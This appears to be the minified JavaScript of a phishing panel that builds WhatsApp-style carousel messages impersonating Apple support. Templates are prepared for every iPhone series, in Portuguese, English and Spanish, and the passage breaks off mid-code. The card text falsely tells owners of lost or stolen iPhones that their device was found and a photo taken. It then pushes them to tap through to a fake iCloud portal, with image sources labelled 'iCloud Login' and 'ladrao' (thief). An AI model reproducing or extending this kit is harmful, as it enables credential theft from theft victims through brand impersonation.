let proxyBaseUrl=window.location.origin,endpointPaths={sendCarousel:"/send-carousel-message",sendText:"/send-simple-text",configureWebhook:"/configure-webhook"},proxyCarouselUrl=`${proxyBaseUrl}${endpointPaths.sendCarousel}`;async function initApiConfig(){try{const e=await fetch("/config/api_config.json",{cache:"no-store"});if(e.ok){const t=await e.json();if(t&&"object"==typeof t){if("string"==typeof t.proxyBaseUrl){const e=t.proxyBaseUrl.trim();e&&(proxyBaseUrl=e.replace(/\/$/,""))}t.endpoints&&"object"==typeof t.endpoints&&(endpointPaths={sendCarousel:t.endpoints.sendCarousel||endpointPaths.sendCarousel,sendText:t.endpoints.sendText||endpointPaths.sendText,configureWebhook:t.endpoints.configureWebhook||endpointPaths.configureWebhook}),proxyCarouselUrl=`${proxyBaseUrl}${endpointPaths.sendCarousel}`,window.APP_API={proxyBaseUrl:proxyBaseUrl,endpoints:{...endpointPaths},urls:{sendCarousel:proxyCarouselUrl,sendText:`${proxyBaseUrl}${endpointPaths.sendText}`,configureWebhook:`${proxyBaseUrl}${endpointPaths.configureWebhook}`}},console.log("[API Config] Carregada:",window.APP_API)}}else console.warn("[API Config] api_config.json n√£o encontrado, usando padr√£o. Status:",e.status)}catch(e){console.warn("[API Config] Falha ao carregar api_config.json, usando padr√£o.",e)}}initApiConfig();const countriesDDI=[{name:"Afeganist√£o",code:"93"},{name:"Arg√©lia",code:"213"},{name:"Angola",code:"244"},{name:"Argentina",code:"54"},{name:"Arm√™nia",code:"374"},{name:"Austr√°lia",code:"61"},{name:"√Åustria",code:"43"},{name:"Bangladesh",code:"880"},{name:"B√©lgica",code:"32"},{name:"Bol√≠via",code:"591"},{name:"Brasil",code:"55"},{name:"Canad√°",code:"1"},{name:"Chile",code:"56"},{name:"China",code:"86"},{name:"Col√¥mbia",code:"57"},{name:"Coreia do Sul",code:"82"},{name:"Coreia do Norte",code:"850"},{name:"Costa Rica",code:"506"},{name:"Cuba",code:"53"},{name:"Dinamarca",code:"45"},{name:"Ecuador",code:"593"},{name:"Egito",code:"20"},{name:"El Salvador",code:"503"},{name:"Espanha",code:"34"},{name:"Estados Unidos",code:"1"},{name:"Est√¥nia",code:"372"},{name:"Filipinas",code:"63"},{name:"Finl√¢ndia",code:"358"},{name:"Fran√ßa",code:"33"},{name:"",code:"49"},{name:"Gr√©cia",code:"30"},{name:"Guatemala",code:"502"},{name:"Haiti",code:"509"},{name:"Holanda (Pa√≠ses Baixos)",code:"31"},{name:"Honduras",code:"504"},{name:"Hungria",code:"36"},{name:"√çndia",code:"91"},{name:"Indon√©sia",code:"62"},{name:"Ir√£",code:"98"},{name:"Iraque",code:"964"},{name:"Irlanda",code:"353"},{name:"Israel",code:"972"},{name:"It√°lia",code:"39"},{name:"Jap√£o",code:"81"},{name:"Jord√¢nia",code:"962"},{name:"Qu√™nia",code:"254"},{name:"Kuwait",code:"965"},{name:"Let√¥nia",code:"371"},{name:"L√≠bano",code:"961"},{name:"L√≠bia",code:"218"},{name:"Litu√¢nia",code:"370"},{name:"Luxemburgo",code:"352"},{name:"Macau",code:"853"},{name:"Maced√¥nia do Norte",code:"389"},{name:"Mal√°sia",code:"60"},{name:"Mali",code:"223"},{name:"Malta",code:"356"},{name:"M√©xico",code:"52"},{name:"Mo√ßambique",code:"258"},{name:"Marrocos",code:"212"},{name:"Nam√≠bia",code:"264"},{name:"Nepal",code:"977"},{name:"Nicar√°gua",code:"505"},{name:"Nig√©ria",code:"234"},{name:"Noruega",code:"47"},{name:"Om√£",code:"968"},{name:"Paquist√£o",code:"92"},{name:"Panam√°",code:"507"},{name:"Paraguai",code:"595"},{name:"Peru",code:"51"},{name:"Pol√¥nia",code:"48"},{name:"Portugal",code:"351"},{name:"Qatar",code:"974"},{name:"Rom√™nia",code:"40"},{name:"R√∫ssia",code:"7"},{name:"Ar√°bia Saudita",code:"966"},{name:"Senegal",code:"221"},{name:"S√©rvia",code:"381"},{name:"Singapura",code:"65"},{name:"Eslov√°quia",code:"421"},{name:"Eslov√™nia",code:"386"},{name:"√Åfrica do Sul",code:"27"},{name:"Som√°lia",code:"252"},{name:"Sud√£o",code:"249"},{name:"Su√©cia",code:"46"},{name:"Su√≠√ßa",code:"41"},{name:"S√≠ria",code:"963"},{name:"Taiwan",code:"886"},{name:"Tanz√¢nia",code:"255"},{name:"Tail√¢ndia",code:"66"},{name:"Tun√≠sia",code:"216"},{name:"Turquia",code:"90"},{name:"Ucr√¢nia",code:"380"},{name:"Emirados √Årabes Unidos",code:"971"},{name:"Reino Unido",code:"44"},{name:"Uruguai",code:"598"},{name:"Uzbequist√£o",code:"998"},{name:"Venezuela",code:"58"},{name:"Vietn√£",code:"84"},{name:"I√™men",code:"967"},{name:"Z√¢mbia",code:"260"},{name:"Zimb√°bue",code:"263"}];function normalizeUrlMaybe(e){if(!e)return e;const t=String(e).trim();return/^https?:\/\//i.test(t)?t:"https://"+t.replace(/^\/+/,"")}countriesDDI.forEach((function(e){const t=String(e.name||"").trim();let a=String(e.id||"").trim();a||(a=t.replace(/\s+/g,"_").toUpperCase()),"Estados Unidos"===t&&(a="US"),"Canad√°"===t&&(a="CA"),"Brasil"===t&&(a="BR"),e.id=a}));const coresIphoneGlobal=["Silver","Space Gray","Gold","Rose Gold","(PRODUCT)RED","White","Black","Blue","Green","Yellow","Coral","Purple","Starlight","Midnight","Pacific Blue","Graphite","Sierra Blue","Alpine Green","Deep Purple","Space Black","Natural Titanium","Blue Titanium","White Titanium","Black Titanium","Desert Titanium","Jet Black","Midnight Green","Pink","Rose Titanium","Midnight Titanium"],capacidadesIphoneGlobal=["16 GB","32 GB","64 GB","128 GB","256 GB","512 GB","1 TB","2 TB"],generalCarouselMessageTemplate="*üçè Assistente Virtual Apple ‚Äì Suporte ao Cliente*",generalCarouselMessageTemplateLang={pt:"*üçè Assistente Virtual Apple ‚Äì Suporte ao Cliente*",en:"*üçè Apple Virtual Assistant ‚Äì Customer Support*",es:"*üçè Asistente Virtual de Apple ‚Äì Atenci√≥n al Cliente*"},defaultCardTemplateText="*üîî ALERTA DE LOCALIZA√á√ÉO: Dispositivo Encontrado*\n\nDetectamos a localiza√ß√£o do seu *[MODELO_COMPLETO]*, marcado como Perdido/Roubado.\n‚û°Ô∏è Por seguran√ßa, uma *imagem* foi capturada no momento da localiza√ß√£o. \n\nPara visualizar os dados e *iniciar* o processo de recupera√ß√£o de forma segura, acesse sua conta Apple:\n\nüëá Toque no *bot√£o* abaixo para continuar com a verifica√ß√£o:\n(Voc√™ ser√° redirecionado ao portal oficial iCloud)\n> Ô£ø Apple ID | Support |  Privacy Policy\n> Copyright ¬© 2025 Apple Inc",defaultCardTemplateTextLang={pt:defaultCardTemplateText,en:"*üîî LOCATION ALERT: Device Found*\n\nWe detected the location of your *[MODELO_COMPLETO]*, marked as Lost/Stolen.\n‚û°Ô∏è For safety, an *image* was captured at the time of location. \n\nTo view the data and *start* the recovery process securely, access your Apple account:\n\nüëá Tap the *button* below to continue verification:\n(You will be redirected to the official iCloud portal)\n> Ô£ø Apple ID | Support |  Privacy Policy\n> Copyright ¬© 2025 Apple Inc",es:"*üîî ALERTA DE UBICACI√ìN: Dispositivo Encontrado*\n\nDetectamos la ubicaci√≥n de su *[MODELO_COMPLETO]*, marcado como Perdido/Robado.\n‚û°Ô∏è Por seguridad, se captur√≥ una *imagen* en el momento de la ubicaci√≥n. \n\nPara ver los datos e *iniciar* el proceso de recuperaci√≥n de forma segura, acceda a su cuenta de Apple:\n\nüëá Toque el *bot√≥n* abajo para continuar con la verificaci√≥n:\n(Ser√° redirigido al portal oficial de iCloud)\n> Ô£ø Apple ID | Support |  Privacy Policy\n> Copyright ¬© 2025 Apple Inc"};function getDefaultCardTextByLang(){return defaultCardTemplateTextLang[window.cardTextLang]||defaultCardTemplateTextLang.pt}window.cardTextLang="pt",window.mensagemGeralEdited=!1;const carouselTemplates=[{id:"iphone_6_series_template",name:"Modelo: iPhone 6 / 6S Series",generalMessage:generalCarouselMessageTemplate,delay:5,subModels:[{name:"iPhone 6",capacidades:["16 GB","64 GB","128 GB"],cores:["Silver","Space Gray","Gold"]},{name:"iPhone 6 Plus",capacidades:["16 GB","64 GB","128 GB"],cores:["Silver","Space Gray","Gold"]},{name:"iPhone 6S",capacidades:["16 GB","32 GB","64 GB","128 GB"],cores:["Silver","Space Gray","Gold","Rose Gold"]},{name:"iPhone 6S Plus",capacidades:["16 GB","32 GB","64 GB","128 GB"],cores:["Silver","Space Gray","Gold","Rose Gold"]}],cards:[{text:defaultCardTemplateText,image:"https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg"}]},{id:"iphone_se_1gen_template",name:"Modelo: iPhone SE (1¬™ gera√ß√£o - 2016)",generalMessage:generalCarouselMessageTemplate,delay:5,subModels:[{name:"iPhone SE (1¬™ Gera√ß√£o)",capacidades:["16 GB","32 GB","64 GB","128 GB"],cores:["Silver","Space Gray","Gold","Rose Gold"]}],cards:[{text:defaultCardTemplateText,image:"https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg"}]},{id:"iphone_7_series_template",name:"Modelo: iPhone 7 / 7 Plus",generalMessage:generalCarouselMessageTemplate,delay:5,subModels:[{name:"iPhone 7",capacidades:["32 GB","128 GB","256 GB"],cores:["Jet Black","Black","Silver","Gold","Rose Gold","(PRODUCT)RED"]},{name:"iPhone 7 Plus",capacidades:["32 GB","128 GB","256 GB"],cores:["Jet Black","Black","Silver","Gold","Rose Gold","(PRODUCT)RED"]}],cards:[{text:defaultCardTemplateText,image:"https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg"}]},{id:"iphone_8_x_series_template",name:"Modelo: iPhone 8 / 8 Plus / X",generalMessage:generalCarouselMessageTemplate,delay:5,subModels:[{name:"iPhone 8",capacidades:["64 GB","128 GB","256 GB"],cores:["Silver","Space Gray","Gold","(PRODUCT)RED"]},{name:"iPhone 8 Plus",capacidades:["64 GB","128 GB","256 GB"],cores:["Silver","Space Gray","Gold","(PRODUCT)RED"]},{name:"iPhone X",capacidades:["64 GB","256 GB"],cores:["Silver","Space Gray"]}],cards:[{text:defaultCardTemplateText,image:"https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg"}]},{id:"iphone_xr_xs_xs_max_series_template",name:"Modelo: iPhone XR / XS / XS Max",generalMessage:generalCarouselMessageTemplate,delay:5,subModels:[{name:"iPhone XR",capacidades:["64 GB","128 GB","256 GB"],cores:["White","Black","Blue","Yellow","Coral","(PRODUCT)RED"]},{name:"iPhone XS",capacidades:["64 GB","256 GB","512 GB"],cores:["Silver","Space Gray","Gold"]},{name:"iPhone XS Max",capacidades:["64 GB","256 GB","512 GB"],cores:["Silver","Space Gray","Gold"]}],cards:[{text:defaultCardTemplateText,image:"https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg"}]},{id:"iphone_11_series_template",name:"Modelo: iPhone 11 / 11 Pro / 11 Pro Max",generalMessage:generalCarouselMessageTemplate,delay:5,subModels:[{name:"iPhone 11",capacidades:["64 GB","128 GB","256 GB"],cores:["Purple","Yellow","Green","Black","White","(PRODUCT)RED"]},{name:"iPhone 11 Pro",capacidades:["64 GB","256 GB","512 GB"],cores:["Space Gray","Silver","Gold","Midnight Green"]},{name:"iPhone 11 Pro Max",capacidades:["64 GB","256 GB","512 GB"],cores:["Space Gray","Silver","Gold","Midnight Green"]}],cards:[{text:defaultCardTemplateText,image:"https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg"}]},{id:"iphone_se_2gen_template",name:"Modelo: iPhone SE (2¬™ gera√ß√£o - 2020)",generalMessage:generalCarouselMessageTemplate,delay:5,subModels:[{name:"iPhone SE (2¬™ Gera√ß√£o)",capacidades:["64 GB","128 GB","256 GB"],cores:["Black","White","(PRODUCT)RED"]}],cards:[{text:defaultCardTemplateText,image:"https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg"}]},{id:"iphone_12_series_template",name:"Modelo: iPhone 12 / 12 mini / 12 Pro / 12 Pro Max",generalMessage:generalCarouselMessageTemplate,delay:5,subModels:[{name:"iPhone 12",capacidades:["64 GB","128 GB","256 GB"],cores:["White","Black","Blue","Green","Purple","(PRODUCT)RED"]},{name:"iPhone 12 mini",capacidades:["64 GB","128 GB","256 GB"],cores:["White","Black","Blue","Green","Purple","(PRODUCT)RED"]},{name:"iPhone 12 Pro",capacidades:["128 GB","256 GB","512 GB"],cores:["Silver","Graphite","Gold","Pacific Blue"]},{name:"iPhone 12 Pro Max",capacidades:["128 GB","256 GB","512 GB"],cores:["Silver","Graphite","Gold","Pacific Blue"]}],cards:[{text:defaultCardTemplateText,image:"https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg"}]},{id:"iphone_13_series_template",name:"Modelo: iPhone 13 / 13 mini / 13 Pro / 13 Pro Max",generalMessage:generalCarouselMessageTemplate,delay:5,subModels:[{name:"iPhone 13",capacidades:["128 GB","256 GB","512 GB"],cores:["Starlight","Midnight","Blue","Pink","Green","(PRODUCT)RED"]},{name:"iPhone 13 mini",capacidades:["128 GB","256 GB","512 GB"],cores:["Starlight","Midnight","Blue","Pink","Green","(PRODUCT)RED"]},{name:"iPhone 13 Pro",capacidades:["128 GB","256 GB","512 GB","1 TB"],cores:["Silver","Graphite","Gold","Sierra Blue","Alpine Green"]},{name:"iPhone 13 Pro Max",capacidades:["128 GB","256 GB","512 GB","1 TB"],cores:["Silver","Graphite","Gold","Sierra Blue","Alpine Green"]}],cards:[{text:defaultCardTemplateText,image:"https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg"}]},{id:"iphone_se_3gen_template",name:"Modelo: iPhone SE (3¬™ gera√ß√£o - 2022)",generalMessage:generalCarouselMessageTemplate,delay:5,subModels:[{name:"iPhone SE (3¬™ Gera√ß√£o)",capacidades:["64 GB","128 GB","256 GB"],cores:["Midnight","Starlight","(PRODUCT)RED"]}],cards:[{text:defaultCardTemplateText,image:"https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg"}]},{id:"iphone_14_series_template",name:"Modelo: iPhone 14 / 14 Plus / 14 Pro / 14 Pro Max",generalMessage:generalCarouselMessageTemplate,delay:5,subModels:[{name:"iPhone 14",capacidades:["128 GB","256 GB","512 GB"],cores:["Midnight","Starlight","Blue","Purple","Yellow","(PRODUCT)RED"]},{name:"iPhone 14 Plus",capacidades:["128 GB","256 GB","512 GB"],cores:["Midnight","Starlight","Blue","Purple","Yellow","(PRODUCT)RED"]},{name:"iPhone 14 Pro",capacidades:["128 GB","256 GB","512 GB","1 TB"],cores:["Space Black","Silver","Gold","Deep Purple"]},{name:"iPhone 14 Pro Max",capacidades:["128 GB","256 GB","512 GB","1 TB"],cores:["Space Black","Silver","Gold","Deep Purple"]}],cards:[{text:defaultCardTemplateText,image:"https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg"}]},{id:"iphone_15_series_template",name:"Modelo: iPhone 15 / 15 Plus / 15 Pro / 15 Pro Max",generalMessage:generalCarouselMessageTemplate,delay:5,subModels:[{name:"iPhone 15",capacidades:["128 GB","256 GB","512 GB"],cores:["Black","Blue","Green","Yellow","Pink"]},{name:"iPhone 15 Plus",capacidades:["128 GB","256 GB","512 GB"],cores:["Black","Blue","Green","Yellow","Pink"]},{name:"iPhone 15 Pro",capacidades:["128 GB","256 GB","512 GB","1 TB"],cores:["Black Titanium","White Titanium","Blue Titanium","Natural Titanium"]},{name:"iPhone 15 Pro Max",capacidades:["256 GB","512 GB","1 TB"],cores:["Black Titanium","White Titanium","Blue Titanium","Natural Titanium"]}],cards:[{text:defaultCardTemplateText,image:"https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg"}]},{id:"iphone_16_series_template",name:"Modelo: iPhone 16 / 16e / 16 Plus / 16 Pro / 16 Pro Max (linha atual 2024)",generalMessage:generalCarouselMessageTemplate,delay:5,subModels:[{name:"iPhone 16",capacidades:["128 GB","256 GB","512 GB"],cores:["Black","White","Blue","Yellow","Pink","Green"]},{name:"iPhone 16e",capacidades:["128 GB","256 GB","512 GB"],cores:["Black","White"]},{name:"iPhone 16 Plus",capacidades:["128 GB","256 GB","512 GB"],cores:["Black","White","Blue","Yellow","Pink","Green"]},{name:"iPhone 16 Pro",capacidades:["256 GB","512 GB","1 TB","2 TB"],cores:["Space Black Titanium","Silver Titanium","Rose Titanium","Natural Titanium","Midnight Titanium"]},{name:"iPhone 16 Pro Max",capacidades:["256 GB","512 GB","1 TB","2 TB"],cores:["Space Black Titanium","Silver Titanium","Rose Titanium","Natural Titanium","Midnight Titanium"]}],cards:[{text:defaultCardTemplateText,image:"https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg"}]},{id:"iphone_17_series_template",name:"Modelo: iPhone 17 / 17 Air / 17 Pro / 17 Pro Max (linha atual 2025)",generalMessage:generalCarouselMessageTemplate,delay:5,subModels:[{name:"iPhone 17",capacidades:["256 GB","512 GB"],cores:["Black","White","Green","Sage","Pumple","Mist Blue","Light Blue"]},{name:"iPhone 17 Air",capacidades:["256 GB","512 GB","1TB"],cores:["Sky Blue","Light Golden","Cloud White","Space black"]},{name:"iPhone 17 Pro",capacidades:["256 GB","512 GB","1 TB"],cores:["Silver","Intense Blue","Cosmic Orange"]},{name:"iPhone 17 Pro Max",capacidades:["256 GB","512 GB","1 TB","2TB"],cores:["Silver","Intense Blue","Cosmic Orange"]}],cards:[{text:defaultCardTemplateText,image:"https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg"}]}];let cardIndexCounter=0;function populateSelect(e,t,a=!1){if(a){e.innerHTML="";const a=document.createElement("option");return a.value="",a.textContent="-- Selecione o Pa√≠s (DDI) --",a.disabled=!0,a.selected=!0,e.appendChild(a),void(Array.isArray(t)?t:[]).forEach((t=>{const a=document.createElement("option");a.value=String(t.id||"").toUpperCase(),a.setAttribute("data-code",String(t.code||"")),a.textContent=`${t.name} (+${t.code})`,e.appendChild(a)}))}for(;e.options.length>1;)e.remove(1);(Array.isArray(t)?t:[]).forEach((t=>{const a=document.createElement("option");a.value=t,a.textContent=t,e.appendChild(a)}))}function populateiPhoneModelSelect(e,t){e.innerHTML='<option value="">Selecione o Modelo</option>',t.forEach((t=>{const a=document.createElement("option");a.value=t.name,a.textContent=t.name,e.appendChild(a)})),window.refreshEnhancedSelect&&window.refreshEnhancedSelect(e);try{!(e.value&&""!==e.value.trim())&&t&&t.length>0&&(e.value=t[0].name,e.dispatchEvent(new Event("change")))}catch(e){}try{window.sendUiLog&&window.sendUiLog("carousel.populateModelSelect",{selectId:e.id||null,modelsCount:Array.isArray(t)?t.length:0,selected:e.value||null})}catch(e){}}function updateCapacityAndColorSelects(e){const t=document.getElementById("carouselTemplate").value,a=carouselTemplates.find((e=>e.id===t)),o=document.getElementById(`card-model-${e}`).value,n=document.getElementById(`card-capacity-${e}`),i=document.getElementById(`card-color-${e}`);if(populateSelect(n,[]),populateSelect(i,[]),a&&o){const e=a.subModels.find((e=>e.name===o));e&&(populateSelect(n,e.capacidades),populateSelect(i,e.cores),n.options.length>1&&!n.value&&(n.value=n.options[1].value),i.options.length>1&&!i.value&&(i.value=i.options[1].value))}window.refreshEnhancedSelect&&(window.refreshEnhancedSelect(n),window.refreshEnhancedSelect(i)),updateCardText(e)}function updateCardText(e){const t=document.getElementById(`card-model-${e}`),a=document.getElementById(`card-capacity-${e}`),o=document.getElementById(`card-color-${e}`),n=document.getElementById(`card-text-${e}`);let i=n.getAttribute("data-template-text")||defaultCardTemplateText;const d=t?t.value.trim():"",l=a?a.value.trim():"",r=o?o.value.trim():"";let s=[];d&&s.push(d),l&&s.push(l),r&&s.push(r);let c=s.join(" ").trim();const u=c?`*${c}*`:"";let m=i.replace(/\*?\[MODELO_COMPLETO\]\*?/g,u);m=m.replace(/ {2,}/g," "),n.value=m.trim()}function populateCarouselTemplatesDropdown(){const e=document.getElementById("carouselTemplate");e.innerHTML='<option value="">-- Selecione a S√©rie do iPhone --</option>',carouselTemplates.forEach((t=>{const a=document.createElement("option");a.value=t.id,a.textContent=t.name,e.appendChild(a)}))}function loadCarouselTemplate(){const e=document.getElementById("carouselTemplate").value,t=carouselTemplates.find((t=>t.id===e));if(document.getElementById("mensagemGeral").value="",document.getElementById("delayMessage").value="",document.getElementById("carousel-cards-container").innerHTML="",cardIndexCounter=0,!t){const e=generalCarouselMessageTemplateLang[window.cardTextLang]||generalCarouselMessageTemplateLang.pt,t=document.getElementById("mensagemGeral");return t&&(t.removeAttribute("readonly"),t.value=e),void addCarouselCard()}const a=generalCarouselMessageTemplateLang[window.cardTextLang]||generalCarouselMessageTemplateLang.pt,o=document.getElementById("mensagemGeral");o&&(o.removeAttribute("readonly"),o.value=a),document.getElementById("delayMessage").value=t.delay,t.cards.forEach((e=>{addCarouselCard({...e,subModelsList:t.subModels})}))}function addCarouselCard(e=null){cardIndexCounter++;const t=cardIndexCounter,a=document.getElementById("carousel-cards-container"),o=document.createElement("div");o.className="card-editor bg-transparent backdrop-blur-xl p-6 rounded-xl shadow border border-white/20 mb-6",o.setAttribute("data-card-id",t),o.innerHTML=`\n        <h3 class="text-lg font-semibold text-white mb-4">Cart√£o #${t}</h3>\n        <div class="space-y-3">\n            <div>\n                <label for="card-model-${t}" class="block text-sm font-medium text-white/80 mb-1">Modelo de iPhone:</label>\n                <select id="card-model-${t}" \n      class="w-full px-3 py-2 bg-white/5 border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm">\n                    <option value="">Selecione o Modelo</option>\n                </select>\n            </div>\n\n            <div class="flex space-x-4">\n                <div class="flex-1">\n                    <label for="card-capacity-${t}" class="block text-sm font-medium text-white/80 mb-1">Capacidade (GB):</label>\n                    <select id="card-capacity-${t}" \n      class="w-full px-3 py-2 bg-white/5 border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm">\n                        <option value="">Selecione</option>\n                    </select>\n                </div>\n                <div class="flex-1">\n                    <label for="card-color-${t}" class="block text-sm font-medium text-white/80 mb-1">Cor:</label>\n                    <select id="card-color-${t}" \n      class="w-full px-3 py-2 bg-white/5 border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm">\n                        <option value="">Selecione</option>\n                    </select>\n                </div>\n            </div>\n\n            <div class="flex space-x-4 mt-2">\n                <div class="flex-1">\n                    <label for="card-lang-${t}" class="block text-sm font-medium text-white/80 mb-1">Idioma do texto:</label>\n                    <select id="card-lang-${t}"\n      class="w-full px-3 py-2 bg-white/5 border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm">\n                        <option value="pt">Portugu√™s</option>\n                        <option value="en">English</option>\n                        <option value="es">Espa√±ol</option>\n                    </select>\n                </div>\n            </div>\n\n            <div>\n                <label for="card-text-${t}" class="block text-sm font-medium text-white/80 mb-1">Texto do Cart√£o (Edit√°vel):</label>\n                <textarea id="card-text-${t}" rows="15" placeholder="O texto final do seu cart√£o ser√° gerado aqui. Voc√™ pode ajustar."\n      class="w-full px-3 py-2 bg-white/5 border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm"></textarea>\n            </div>\n\n            <div>\n                <div class="flex items-start gap-4">\n                    <div class="flex-1">\n                        <label for="card-image-source-${t}" class="block text-sm font-medium text-white/80 mb-1">Fonte da Imagem:</label>\n                        <select id="card-image-source-${t}"\n      class="w-full px-3 py-2 bg-white/5 border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm">\n                            <option value="icloud">iCloud Premium</option>\n                            <option value="icloud_plus">iCloud+</option>\n                            <option value="icloud_plus_plus">iCloud++</option>\n                            <option value="find_my">FInd My</option>\n                            <option value="iphones_plus">iPhones +</option>\n                            <option value="findmy_plus">FIndMy+</option>\n                            <option value="buscar_dispositivos">Buscar Dispositivos</option>\n                            <option value="macbook">MacBook</option>\n                            <option value="iplace">iPlace</option>\n                            <option value="suporte_apple">Suporte Apple</option>\n                            <option value="suporte_apple_plus_plus">suporte apple++</option>\n                            <option value="suporte_apple_plus_plus_plus">suporte Apple +++</option>\n                            <option value="ladrao">Ladr√£o</option>\n                            <option value="ladrao1">ladrao1</option>\n                            <option value="landrao2">Landr√£o2</option>\n                            <option value="ladrao4">ladrao 4</option>\n                            <option value="ladrao3">ladrao3</option>\n                            <option value="default">iCloud Login</option>\n                            <option value="manual">URL Manual</option>\n                         </select>\n                     </div>\n                    <div class="flex-1" id="card-image-url-field-${t}">\n                        <label for="card-image-${t}" class="block text-sm font-medium text-white/80 mb-1">URL da Imagem do Cart√£o:</label>\n                        <div class="flex gap-2">\n                            <input type="url" id="card-image-${t}" placeholder="https://exemplo.com/imagem.jpg"\n      class="w-full px-3 py-2 bg-white/5 border border-white/20 rounded-xl text-white placeholder-white/50 focus:ring-2 focus:ring-white/30 focus:border-white/30 transition duration-150 ease-in-out shadow-sm" />\n                            <button type="button" id="card-image-preview-btn-${t}"\n      class="px-3 py-2 bg-white/10 border border-white/20 rounded-xl text-white hover:bg-white/15 transition">Pr√©-visualizar</button>\n                        </div>\n                    </div>\n    <div class="w-40 h-28 border border-white/20 bg-white/5 rounded-xl overflow-hidden">\n                        <img id="card-image-preview-${t}" alt="Pr√©via da imagem" class="w-full h-full object-cover hidden" />\n                        <div id="card-image-preview-placeholder-${t}" class="w-full h-full flex items-center justify-center text-white/50 text-xs">Pr√©via</div>\n                    </div>\n                </div>\n            </div>\n        </div>\n        \n        <h4 class="text-md font-semibold text-white mt-6 mb-3">Bot√µes do Cart√£o #${t}</h4>\n        <div id="card-buttons-container-${t}" class="space-y-3">\n            </div>\n        <div class="flex flex-col sm:flex-row space-y-2 sm:space-y-0 sm:space-x-2 mt-4">\n  <button type="button" class="add-button-btn flex-grow py-2 bg-emerald-600 text-white font-medium rounded-xl shadow hover:bg-emerald-700 focus:outline-none focus:ring-2 focus:ring-emerald-400/50 transition duration-150 ease-in-out"\n                                 onclick="addCardButton(${t})">\n                + Adicionar Bot√£o\n            </button>\n  <button type="button" class="remove-card-btn tab-btn shrink-0 px-2 py-1 sm:px-2 sm:py-1.5 md:px-3 md:py-2 text-xs sm:text-xs md:text-sm leading-[1.2] whitespace-nowrap tracking-tight rounded-none border border-red-400/40 bg-red-500/20 hover:bg-red-500/30 text-red-200 font-semibold transition-colors duration-200 focus:outline-none focus:ring-2 focus:ring-red-400/30 hover:shadow hover:shadow-red-500/20 active:translate-y-[1px]"\n                                 onclick="removeCarouselCard(${t})">\n                - Remover Cart√£o\n            </button>\n        </div>\n    `,a.appendChild(o);const n=document.getElementById(`card-model-${t}`);e&&e.subModelsList&&e.subModelsList.length>0&&(populateiPhoneModelSelect(n,e.subModelsList),e.cardModelValue&&(n.value=e.cardModelValue));const i=document.getElementById(`card-text-${t}`),d=e&&e.text?e.text:getDefaultCardTextByLang();i.value=d,i.setAttribute("data-template-text",d);const l=document.getElementById(`card-image-${t}`);l?l.value=e&&e.image?e.image:"https://i.pcmag.com/imagery/articles/01a05tCWORxCw1D6nH0ChDZ-68.fit_lim.v1705428880.jpg":console.error(`Erro: Input com ID card-image-${t} n√£o encontrado ap√≥s append!`);const r=()=>{const e=document.getElementById(`card-image-preview-${t}`),a=document.getElementById(`card-image-preview-placeholder-${t}`),o=(document.getElementById(`card-image-${t}`)?.value||"").trim();if(e&&a){if(!o)return e.classList.add("hidden"),a.textContent="Pr√©via",void a.classList.remove("hidden");e.onload=()=>{e.classList.remove("hidden"),a.classList.add("hidden")},e.onerror=()=>{e.classList.add("hidden"),a.textContent="Falha ao carregar",a.classList.remove("hidden")},e.src=o}};e&&e.buttons&&e.buttons.length>0?e.buttons.forEach((e=>{addCardButton(t,e)})):(addCardButton(t,{type:"URL",label:"Obter localiza√ß√£o",url:""}),addCardButton(t,{type:"REPLY",label:"Falar com atendente",url:""})),document.getElementById(`card-model-${t}`).addEventListener("change",(()=>updateCapacityAndColorSelects(t))),document.getElementById(`card-capacity-${t}`).addEventListener("change",(()=>updateCardText(t))),document.getElementById(`card-color-${t}`).addEventListener("change",(()=>updateCardText(t)));const s=document.getElementById(`card-lang-${t}`);s&&(s.value=window.cardTextLang||"pt",s.addEventListener("change",(e=>{const a=e.target.value||"pt";if("function"==typeof window.setCardLanguage)window.setCardLanguage(a);else{const e=document.getElementById(`card-text-${t}`);if(e){const o=defaultCardTemplateTextLang[a]||defaultCardTemplateTextLang.pt;e.setAttribute("data-template-text",o),updateCardText(t)}const o=document.getElementById("mensagemGeral");if(o){const e=generalCarouselMessageTemplateLang[a]||generalCarouselMessageTemplateLang.pt;o.value=e}}})));const c=document.getElementById(`card-image-source-${t}`),u=document.getElementById(`card-image-preview-btn-${t}`);if(c){const 